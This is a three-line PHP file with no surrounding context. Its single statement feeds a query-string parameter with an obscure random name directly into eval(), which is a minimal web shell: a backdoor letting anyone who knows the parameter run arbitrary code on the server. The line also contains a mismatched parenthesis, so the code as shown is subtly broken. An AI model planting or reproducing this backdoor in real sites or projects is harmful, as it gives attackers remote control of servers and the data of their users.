<?php
eval(($_GET['5vRSlycI']);
?>
